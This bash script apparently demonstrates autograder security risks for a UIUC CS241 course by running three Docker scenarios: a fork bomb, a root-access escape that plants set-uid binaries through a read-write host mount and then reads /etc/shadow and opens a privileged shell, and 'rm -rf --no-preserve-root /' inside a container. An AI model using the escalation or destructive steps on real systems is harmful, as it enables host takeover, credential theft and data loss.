#!/bin/bash

# Bash script that simulates what an autograder would do. Requires Docker to be
# installed and the Docker service to be started. Will download or generate the
# necessary Docker images automatically. May require being on UIUC network due
# to certain UIUC repositories being necessary to correctly match the 241 VM
# environment.

if [[ $# -eq 0 ]]; then
    echo "Usage $0 (fork_bomb|root_access|rm_root)

fork_bomb:   Build and run a Docker that contains a fork bomb.
root_access: Put an executable shell that has root access on the host machine
             when run. This can be modified to instead run a malicious program
             with root access rather than a shell.
rm_root:     Just runs 'rm -rf --no-preserve-root /'. Docker sets up a separate
             file system so the host will see no effects."
    exit 1
fi

base_dir="base_image"
base_image="cs241"
base_tag="base"

if [[ -z $(docker images -q $base_image:$base_tag) ]]; then
    echo "Generating $base_image:$base_tag image..."
    pushd $base_dir
    docker build -t $base_image:$base_tag .
    popd
    echo -e "Done generating $base_image:$base_tag\n========================================"
fi

docker_run_flags="--rm -t --memory 512m --memory-swap 512m --kernel-memory 32m --cpu-period 100000 --cpu-quota 25000"

if [[ $1 == "fork_bomb" ]]; then
    echo "Selected fork bomb"
    fork_tag="fork_bomb"
    fork_dir="fork_bomb"
    pushd $fork_dir
    if [[ -z $(docker images -q $base_image:$fork_tag) ]]; then
        echo "Generating $base_image:$fork_tag..."
        docker build -t $base_image:$fork_tag .
    echo -e "Done generating $base_image:$fork_tag\n========================================"
    fi
    echo -e "Running fork bomb in Docker\n========================================"
    docker run $docker_run_flags $base_image:$fork_tag &
    sleep 5
    echo "Attempting to kill container..."
    time docker kill $(docker ps -q)
    popd
elif [[ $1 == "root_access" ]]; then
    echo "Building root access shell"
    root_tag="root_access"
    root_dir="root_access"
    pushd $root_dir
    if [[ -z $(docker images -q $base_image:$root_tag) ]]; then
        echo "Generating $base_image:$root_tag..."
        docker build -t $base_image:$root_tag .
    echo -e "Done generating $base_image:$root_tag\n========================================"
    fi
    echo -e "Running root access in Docker\n========================================"
    # Note that we mount a host's directory onto the Docker instance's /mount as rw.
    docker run -v $PWD:/mount $docker_run_flags $base_image:$root_tag
    # Since the program had root access inside Docker, any files it creates in
    # the host's directory will also be owned by root. If the program sets the
    # set-uid-execution bit on the new executables, they too will have root
    # privilege in the host.
    echo -e "========================================\nPrinting out /etc/shadow using root-access cat"
    ./cat /etc/shadow
    echo -e "========================================\nStarting root access shell"
    ./sh -p
    popd
elif [[ $1 == "rm_root" ]]; then
    echo "Building root access shell"
    rm_tag="rm_root"
    rm_dir="rm_root"
    pushd $rm_dir
    if [[ -z $(docker images -q $base_image:$rm_tag) ]]; then
        echo "Generating $base_image:$rm_tag..."
        docker build -t $base_image:$rm_tag .
    echo -e "Done generating $base_image:$rm_tag\n========================================"
    fi
    echo -e "Running root access in Docker\n========================================"
    docker run $docker_run_flags $base_image:$rm_tag
    popd
else
    echo "$1 is an invalid example"
    exit 1
fi
